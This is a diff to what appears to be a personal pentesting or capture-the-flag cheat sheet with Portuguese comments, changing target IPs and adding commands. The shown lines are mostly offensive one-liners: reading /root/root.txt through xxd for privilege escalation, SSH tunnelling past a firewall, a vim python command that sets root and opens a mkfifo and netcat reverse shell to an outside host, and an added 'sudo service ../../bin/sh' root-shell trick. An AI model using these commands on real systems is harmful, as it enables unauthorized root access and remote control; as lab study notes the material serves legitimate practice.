@@ -1,5 +1,5 @@
 my ip = 10.6.8.59
-ip machine = 10.10.40.219
+ip machine = 10.10.70.220
 
 
 
@@ -186,7 +186,7 @@ save                                     # configurar RCE em servidor com redis 
 
 LFILE=/root/root.txt
 echo $LFILE
-usr/bin/xxd "$LFILE" | xxd -r   #exploração de xxd para elevação de privilégios
+./usr/bin/xxd "$LFILE" | xxd -r   #exploração de xxd para elevação de privilégios
 
 ssh -L 10000:localhost:10000 agent47@10.10.254.48 #expor ssh sem precisar passar pelo firewall de outra máquina na rede local
 
@@ -249,9 +249,11 @@ ssh -i <privatekeygeradacomonomedousuariogeralmente> <user>@<ip>   #acessar por 
 vim.basic -c ':py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f")'   #shell com vim
 vim.basic -c ': py3 import os; os.setuid (0); os.execl ("/ bin / sh", "sh", "-c", "reset; exec sh") '  #alternativa ao comando de cima, podemos apenas pegar root na mesma sessão
 
+sudo service ../../bin/sh   #priv esc com sudo em service
 
+http.request.method == <GET/POST/PUT...> #wireshark filtrar por metodo
 
-
+tcp.port == <porta>
 
 
 
